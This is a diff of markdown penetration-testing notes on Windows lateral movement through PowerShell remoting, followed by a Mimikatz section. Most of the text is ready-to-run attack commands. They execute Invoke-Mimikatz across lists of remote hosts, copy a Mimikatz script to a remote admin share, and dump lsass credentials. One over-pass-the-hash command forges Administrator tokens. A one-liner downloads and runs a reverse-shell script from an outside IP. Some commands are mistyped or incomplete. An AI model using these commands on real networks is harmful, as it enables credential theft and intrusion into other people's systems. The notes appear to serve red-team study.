@@ -25,17 +25,43 @@ ls \\\\\[hostname]\c$
 ****$sess = New-PSSession -Computername hostname.local\
 Enter-PSSession $sess
 
-**Execute commands on a machine (non-interactive)**\
-Invoke-Command -Scriptblock {whoami} -Computername (Get-Content \<list-of-servers-file>) \
-Invoke-Command -Computername hostname -Scriptblock {whoami;hostname}
+No local file be included in Enter-PSSession/New-PSSession
+
+**Execute commands on a machine(s) (non-interactive)**\
+Invoke-Command -Computername hostname -Scriptblock {whoami;hostname}\
+Invoke-Command -Computername hostname -Scriptblock {$executioncontext.sessionstate.languagemode}\
+Invoke-Command -Scriptblock {whoami} -Computername (Get-Content \<list-of-servers-file>)&#x20;
 
 **Execute script on a machine**\
 ****Invoke-Command -Computername (Get-Content \<list-of-servers-file>) -FilePath  C:\scripty\a.ps1\
-Invoke-Command -FilePath $sess
+❗Invoke-Command -FilePath C:\scripty\a.ps1 -Session $sess\
+&#x20;  Enter-PSSession -Session $sess\
+&#x20;  functionname\_in\_aps1
 
-&#x20; **Execute locally loaded function on a list of remote machines**\
-Invoke-Command -Scriptblock ${function:} -Computername (Get-Content \<list\_of\_servers>)\
-Invoke-Command -ScriptBlock ${function:Invoke-Mimikatz} -Computername (Get-Content \<list\_of\_servers>)
+**Execute locally loaded function on a list of remote machines**\
+Invoke-Command -Scriptblock ${function:test} -Computername (Get-Content \<list\_of\_servers>)\
+❗Invoke-Command -ScriptBlock ${function:Invoke-Mimikatz} -Computername (Get-Content \<list\_of\_servers>)
+
+A file/function test.ps1 is creatd and . .\test.ps1 With the content
+
+function test\
+{\
+&#x20;Write-Output "Test" \
+}
+
+then run "test"  => Then we can run Invoke-Command -Scriptblock ${function:test} -Computername a\_host
+
+**Execute locally loaded function on a list of remote machines & passing arguemnts (only positional arguments could be passed)**\
+****Invoke-Command -ScriptBlock ${fucntion:getPassHashes} -Hostname a\_host -ArgumentList
+
+
+
+Use "Stateful" command using Invoke-Command:\
+$sess = New-PSSession -computername host1\
+Invoke-Command -session $sess -ScriptBlock {$Proc = Get-Process}\
+Invoke-Command -session $sess -ScriptBlock {$Proc.Name}
+
+
 
 **Copy script to other server**\
 ****Copy-Item .\Invoke-MimikatzEx.ps1 \\\hostname\c$\\'Program Files'
@@ -44,8 +70,20 @@ Invoke-Command -ScriptBlock ${function:Invoke-Mimikatz} -Computername (Get-Conte
 powershell.exe iex (iwr http://xx.xx.xx.xx/Invoke-PowerShellTcp.ps1 -UseBasicParsing);reverse -Reverse -IPAddress xx.xx.xx.xx -Port 4000\
 ****
 
-```
-```
+## Mimikatz - Invoke-Mimikatz
+
+* Dump credentials, tickets, passing & replaying hashes
+* Using the code from ReflectivePEInjection mimikatz is loaded reflectively into memory.
+* Administrative Privilege is needed for reading/writing to lsass e.g. dumping creds
+
+**Dump credentials on local/remote machine**\
+****Invoke-Mimikatz -DumpCreds   //default parameter\
+****Invoke-Mimikatz -DumpCreds -Computername @("host1","host2")    //uses PowerShell remoting cmdlet Invoke-Command (need local admin privs on remote host)
+
+**Write to lsass / "over pass the hash" - generate tokens from hashes (we have the hash for the User specified)**\
+****Invoke-Mimikatz -command '"sekurlsa::pth /user:Administrator /domain:dom.local /ntlm:\<ntlmhash> /run:powershell.exe"'
+
+Creates a valid kerberos ticket using the ntlm hash of a user. Authenticate to Kerberos enabled Services afterfwards.
 
 ## **Kerberoasting**
 
